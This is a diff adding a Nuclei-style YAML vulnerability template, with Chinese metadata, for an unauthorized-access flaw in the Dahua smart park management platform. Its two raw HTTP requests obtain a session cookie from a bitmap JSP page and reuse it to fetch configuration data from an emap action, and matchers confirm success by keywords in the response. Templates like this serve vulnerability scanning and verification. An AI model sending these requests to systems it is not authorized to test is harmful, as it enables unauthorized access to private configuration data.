@@ -1,0 +1,62 @@
+id: dahua-wpms-client_bitmap_metro-unauth
+info:
+  name: 大华智慧园区管理平台存在未授权访问
+  author: leadlife
+  severity: high
+  description: 大华智慧园区综合管理平台是一款综合管理平台，具备园区运营、资源调配和智能服务等功能。该平台旨在协助优化园区资源分配，满足多元化的管理需求，同时通过提供智能服务，增强使用体验。
+  reference: 
+    - demo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version: 影响大华智慧园区管理平台2026年以及之前版本
+  tags: 
+
+http:
+  - raw:
+      - |
+        GET /emap/gis/page/bitmap/client_bitmap_metro.jsp?token=MYTOKEN&subSystem=ipms HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Cookie: JSESSIONID=; 
+        Origin: null
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+      
+      - |+
+        POST /emap/emap_findConfigData.action?token=MYTOKEN HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Cookie: {{session}}
+        Origin: null
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+
+        123123
+    
+    extractors:
+      - type: regex
+        name: session
+        part: header_1
+        internal: true
+        regex:
+          - 'JSESSIONID=(.*)'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains_all(body_2,'rotate','mapurl','modelName')
+        condition: and
